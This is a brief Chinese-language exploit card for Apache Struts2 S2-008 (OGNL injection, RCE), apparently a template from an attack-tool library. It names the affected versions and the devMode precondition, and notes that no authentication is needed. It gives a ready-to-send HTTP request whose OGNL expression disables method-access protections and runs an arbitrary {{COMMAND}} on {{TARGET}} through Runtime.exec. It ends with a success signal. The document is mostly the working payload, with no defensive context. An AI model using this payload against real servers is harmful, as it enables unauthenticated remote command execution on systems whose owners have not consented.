# S2-008 OGNL 注入 RCE

## 指纹特征
- 服务: Apache Struts2 (2.1.0 - 2.3.1)
- 条件: `devMode` 为开启状态

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| devMode 调试注入 | `/*.action?debug=command&expression=...` | 无 |

## PoC 指令

通过 `debug=command` 接口直接执行 OGNL 表达式：

```http
GET /devmode.action?debug=command&expression=({{#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false"),#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("{{COMMAND}}")}}) HTTP/1.1
Host: {{TARGET}}:8080
```

## Success Signal
- **状态验证**: 命令成功在服务器执行。
